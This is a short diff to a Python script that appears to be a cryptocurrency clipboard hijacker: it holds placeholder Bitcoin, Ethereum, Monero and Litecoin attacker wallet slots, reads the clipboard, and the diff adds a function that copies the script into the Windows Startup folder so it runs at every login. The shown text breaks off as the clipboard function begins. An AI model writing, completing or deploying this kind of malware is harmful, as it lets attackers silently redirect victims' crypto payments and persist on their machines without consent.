@@ -1,13 +1,22 @@
 import pyperclip as pc
 import time
 import re
-
-#moves program to startup folder. rename file_name.exe
+import time
+import os
+import shutil
 
 BTC_address = "BTC WALLET HERE"
 ETH_address = "ETH WALLET HERE"
 MON_address  = "MONERO WALLET HERE"
 LTC_address = "LTC WALLET HERE"
+
+#moves program to startup folder for current user
+def add_to_startup():
+    user = os.getlogin()
+    basename = os.path.basename(__file__)
+    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+
+add_to_startup()
 
 def clip():
     s = str(pc.paste())
